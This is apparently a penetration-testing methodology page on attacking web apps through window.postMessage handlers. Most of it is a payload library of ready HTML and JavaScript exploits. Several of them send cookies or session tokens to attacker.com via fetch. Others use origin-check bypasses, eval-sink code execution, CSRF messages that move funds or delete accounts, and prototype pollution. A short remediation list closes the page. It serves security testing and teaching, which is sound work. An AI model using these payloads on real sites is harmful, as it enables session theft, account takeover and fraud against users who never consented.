---
title: "postMessage Attacks"
date: 2026-02-24
draft: false
---

# postMessage Attacks

> **Severity**: High | **CWE**: CWE-346, CWE-79
> **OWASP**: A03:2021 – Injection | A01:2021 – Broken Access Control

---

## What Are postMessage Attacks?

`window.postMessage()` enables cross-origin communication between browser windows/iframes/workers. Security issues arise when the **receiving message handler**:
1. Fails to validate the `event.origin` — accepts messages from any origin
2. Passes `event.data` to dangerous sinks (`eval`, `innerHTML`, `location`, `document.write`)
3. Uses `event.source` unsafely to send sensitive data back

Attack surface: the handler is JavaScript code — exploitation leads to **XSS**, **open redirect**, **CSRF**, **data theft**, and **iframe communication abuse**.

```javascript
// VULNERABLE handler — no origin check, data to innerHTML:
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;  // ← XSS
});

// VULNERABLE handler — no origin check, location change:
window.addEventListener('message', function(e) {
    if (e.data.type === 'navigate') {
        window.location = e.data.url;   // ← open redirect / XSS via javascript:
    }
});
```

---

## Discovery Checklist

**Phase 1 — Find postMessage Handlers**
- [ ] Search JS source for `addEventListener('message'`, `onmessage`
- [ ] Check iframes on the target page — does parent communicate with them?
- [ ] Look for third-party widgets (chat, analytics, payment) embedded via iframe
- [ ] Chrome DevTools → Sources → Search for `postMessage` and `addEventListener.*message`
- [ ] Check browser extension communication (if testing extensions)
- [ ] Monitor postMessage events in DevTools: `monitorEvents(window, 'message')`

**Phase 2 — Analyze Handler**
- [ ] Does handler validate `event.origin`? → if not → attackable from any origin
- [ ] What sinks does `event.data` reach? (`innerHTML`, `eval`, `location`, `fetch`, `document.write`)
- [ ] What data does the app send back via `event.source.postMessage()`?
- [ ] What's the message format? (JSON, string, structured object)
- [ ] Are there type/action checks that can be bypassed with prototype pollution?

**Phase 3 — Exploit**
- [ ] Host iframe/window pointing at target → send malicious message
- [ ] Test origin bypass: send from `null` (sandboxed iframe), subdomains, similar-looking origins
- [ ] Test all identified sinks with payloads specific to that sink

---

## Payload Library

### Payload 1 — XSS via innerHTML Sink

```html
<!-- Host on attacker.com — target page has no origin check + innerHTML sink -->
<!DOCTYPE html>
<html>
<body>
<script>
// Open target page in iframe or popup:
var target = window.open('https://target.com/vulnerable-page', 'target');

// Wait for page to load then send XSS payload:
setTimeout(function() {
    // innerHTML sink:
    target.postMessage('<img src=x onerror=alert(document.cookie)>', '*');

    // If handler expects JSON:
    target.postMessage(JSON.stringify({
        type: 'update',
        content: '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>'
    }), '*');

    // HTML entity bypass if filter present:
    target.postMessage('&#x3C;img src=x onerror=alert(1)&#x3E;', '*');
}, 2000);
</script>
</body>
</html>
```

### Payload 2 — Open Redirect / XSS via `location` Sink

```html
<script>
var target = window.open('https://target.com/app', 'target');

setTimeout(function() {
    // Direct location change:
    target.postMessage({type: 'navigate', url: 'https://attacker.com'}, '*');

    // XSS via javascript: URI:
    target.postMessage({type: 'navigate', url: 'javascript:alert(document.cookie)'}, '*');

    // Handler does: document.getElementById('frame').src = e.data.url
    target.postMessage({
        action: 'load',
        src: 'javascript:fetch("https://attacker.com/?c="+document.cookie)'
    }, '*');

    // Handler does: window.location.hash = e.data.hash
    // → DOM XSS via hash change → look for hash-based routing sinks
    target.postMessage({hash: '<img src=x onerror=alert(1)>'}, '*');
}, 2000);
</script>
```

### Payload 3 — Data Theft via Unvalidated `event.source`

```html
<!-- Some apps send sensitive data back to whoever sent the message: -->
<!-- Vulnerable handler:
     window.addEventListener('message', function(e) {
         e.source.postMessage({token: sessionToken, user: currentUser}, e.origin);
     });
-->

<!DOCTYPE html>
<html>
<body>
<iframe id="f" src="https://target.com/app"></iframe>
<script>
window.addEventListener('message', function(e) {
    // Receive stolen data:
    console.log('Stolen:', JSON.stringify(e.data));
    fetch('https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(e.data)));
});

// After iframe loads, trigger data response:
document.getElementById('f').onload = function() {
    document.getElementById('f').contentWindow.postMessage(
        {type: 'getToken'},  // trigger the response
        'https://target.com'
    );
};
</script>
</body>
</html>
```

### Payload 4 — Origin Bypass Techniques

```javascript
// Handler uses weak origin check:
// if (event.origin.indexOf('target.com') !== -1) { ... }
// → Bypass: use origin "https://evil-target.com" or "https://target.com.evil.com"

// Handler checks: event.origin === 'https://target.com'
// This is correct — bypass only via XSS on target.com itself

// Handler checks: event.origin.endsWith('target.com')
// Bypass: register attacker-target.com → endsWith('target.com') = true

// Handler checks: event.origin.startsWith('https://target')
// Bypass: https://target.evil.com or https://targetevil.com

// Null origin bypass — sandboxed iframe has null origin:
// Handler: if (event.origin === null || ...) { process }
// Or: handler doesn't check origin at all
var iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts';   // removes allow-same-origin → null origin
iframe.srcdoc = `<script>
    parent.frames['target-frame'].postMessage(
        '<img src=x onerror=alert(document.domain)>',
        '*'
    );
<\/script>`;
document.body.appendChild(iframe);

// For handlers that check e.origin === 'null':
// srcdoc iframe or data: URI iframe produces origin: null
var iframe = document.createElement('iframe');
iframe.src = 'data:text/html,<script>window.parent.postMessage("payload","*")<\/script>';
document.body.appendChild(iframe);
```

### Payload 5 — CSRF via postMessage

```html
<!-- If target app uses postMessage to trigger state-changing actions,
     and handler has no CSRF token requirement: -->
<script>
var target = window.open('https://target.com/dashboard', 'target');

setTimeout(function() {
    // Trigger privileged action:
    target.postMessage({
        action: 'deleteAccount',
        confirm: true
    }, '*');

    // Transfer funds:
    target.postMessage({
        type: 'transfer',
        to: 'attacker@evil.com',
        amount: 10000
    }, '*');

    // Change email:
    target.postMessage({
        action: 'updateProfile',
        email: 'attacker@evil.com'
    }, '*');
}, 3000);
</script>
```

### Payload 6 — Prototype Pollution + postMessage Chain

```html
<!-- If handler does: Object.assign(config, event.data)
     or uses lodash merge → prototype pollution via postMessage -->
<script>
var target = window.open('https://target.com', 'target');

setTimeout(function() {
    // Prototype pollution payload via postMessage:
    target.postMessage({
        '__proto__': {
            'isAdmin': true,
            'innerHTML': '<img src=x onerror=alert(1)>',
            'debug': true
        }
    }, '*');

    // Via constructor:
    target.postMessage({
        'constructor': {
            'prototype': {
                'isAdmin': true
            }
        }
    }, '*');
}, 2000);
</script>
```

### Payload 7 — `eval()` and `Function()` Sinks

```javascript
// Handler: eval(event.data)
// Or: new Function(event.data)()
// Or: setTimeout(event.data, 0)

// Direct code execution:
target.postMessage("alert(document.domain)", '*');
target.postMessage("fetch('https://attacker.com/?c='+document.cookie)", '*');

// If JSON expected:
target.postMessage(JSON.stringify({
    code: "alert(document.domain)"
}), '*');

// Handler: eval(event.data.lang === 'js' ? event.data.script : '')
target.postMessage({lang: 'js', script: 'alert(1)'}, '*');
```

---

## Tools

```bash
# DOM Invader (Burp built-in browser):
# Settings → postMessage interception → Enable
# Automatically monitors and logs postMessage events
# Can inject payloads into intercepted messages

# Browser DevTools:
# Monitor all postMessage events:
# In console of target page:
window.addEventListener('message', function(e) {
    console.log('Origin:', e.origin, 'Data:', JSON.stringify(e.data));
}, true);

# Or use monitorEvents:
monitorEvents(window, 'message')

# Search for handlers in source:
# DevTools → Sources → Ctrl+Shift+F → search: addEventListener.*message
# Also search: onmessage =

# Find postMessage calls (what's SENT):
# Search: .postMessage(

# Automated scanning:
# PMFuzz (postMessage fuzzer):
git clone https://github.com/nicowillis/pmfuzz 2>/dev/null || true

# Check for postMessage handlers in JS bundles:
grep -rn "addEventListener.*message\|onmessage\|\.postMessage" \
  --include="*.js" . | grep -v "node_modules"

# Identify sinks after finding handler:
# Copy handler code → analyze manually for: innerHTML, eval, location,
# document.write, Function(), setTimeout, setInterval with string

# PoC generator script:
cat > pm_poc.html << 'POCEOF'
<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="TARGET_URL"></iframe>
<script>
var payload = "PAYLOAD_HERE";
document.getElementById('target').onload = function() {
    document.getElementById('target').contentWindow
        .postMessage(payload, '*');
};
window.addEventListener('message', function(e) {
    document.getElementById('log').innerHTML +=
        '<p>Origin: ' + e.origin + '<br>Data: ' +
        JSON.stringify(e.data) + '</p>';
});
</script>
<div id="log"></div>
</body>
</html>
POCEOF
```

---

## Remediation Reference

- **Always validate `event.origin`**: use strict equality `=== 'https://trusted.com'` — never `indexOf`, `endsWith`, or regex without anchoring
- **Never pass `event.data` directly to dangerous sinks**: `innerHTML`, `eval`, `document.write`, `location`, `setTimeout` with string arg
- **Use `event.source.postMessage()` carefully**: validate that `event.source` is the expected child window/iframe before sending sensitive data
- **Structured message format**: use a message schema (action type allowlist) and validate all fields before processing
- **`targetOrigin` parameter**: when sending, always specify the exact target origin — never use `'*'` for sensitive data
- **CSP**: `frame-src` restricts which origins can iframe your content — reduces attack surface

*Part of the Web Application Penetration Testing Methodology series.*
